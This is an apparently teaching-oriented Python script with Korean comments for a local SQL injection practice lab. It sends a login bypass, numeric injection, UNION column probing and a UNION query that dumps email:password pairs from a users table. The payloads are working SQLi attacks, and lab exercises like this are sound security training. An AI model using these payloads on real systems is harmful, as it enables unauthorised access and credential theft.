#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
SQLi Lab 예제 — Python requests 로 실습 서버에 요청 보내기.
VSCode 에서 그대로 실행:  python3 examples/sqli_example.py
(서버가 켜져 있어야 함:  ./scripts/start.sh)
"""
import requests

BASE = "http://127.0.0.1:8000"   # 실습 웹 (로컬 전용)

def show_trace(resp):
    """모든 응답 헤더에는 X-Lab-Trace-ID 가 있음 → Observer 에서 이 값으로 내 요청을 찾음."""
    return resp.headers.get("X-Lab-Trace-ID", "(none)")

print("="*60)
print("[0] 정상 요청 + Trace ID 확인")
r = requests.get(f"{BASE}/labs/level2.php", params={"idx": "1"})
print("  status:", r.status_code, "| Trace:", show_trace(r))

print("="*60)
print("[1] 문자열형 로그인 SQLi (POST) — 비밀번호 몰라도 로그인")
# email 칸에 ' or 1=1 --  를 넣으면 WHERE 절이 항상 참이 됨
r = requests.post(f"{BASE}/labs/level1.php",
                  data={"email": "' or 1=1 -- ", "password": "anything"})
print("  Trace:", show_trace(r))
print("  결과:", "로그인 성공!" if "로그인 성공" in r.text else "실패")

print("="*60)
print("[2] 숫자형 SQLi (GET) — idx 자리에 or 1=1")
r = requests.get(f"{BASE}/labs/level2.php", params={"idx": "0 or 1=1"})
rows = r.text.count("<tr>")   # 행 수 대략 세기
print("  Trace:", show_trace(r), "| 표에 나온 <tr> 개수:", rows, "(1보다 크면 여러 행 유출된 것)")

print("="*60)
print("[3] UNION 으로 컬럼 수(8개) 확인")
r = requests.get(f"{BASE}/labs/level3.php",
                 params={"idx": "0 union select 1,2,3,4,5,6,7,8"})
print("  order by 9 는 에러:", "Unknown column" in
      requests.get(f"{BASE}/labs/level3.php", params={"idx": "1 order by 9"}).text)

print("="*60)
print("[4] UNION 으로 users 테이블 계정 통째로 뽑기")
payload = "0 union select 1,2,3,group_concat(concat(email,0x3a,password)),5,6,7,8 from users"
r = requests.get(f"{BASE}/labs/level4.php", params={"idx": payload})
import re
found = re.findall(r"[\w.]+@[\w.]+:[\w_]+", r.text)
print("  Trace:", show_trace(r))
print("  유출된 계정들:")
for acc in found:
    print("    -", acc)

print("="*60)
print("끝. Observer(http://127.0.0.1:8002/)에서 위 Trace 들로 실제 SQL 을 확인하세요.")
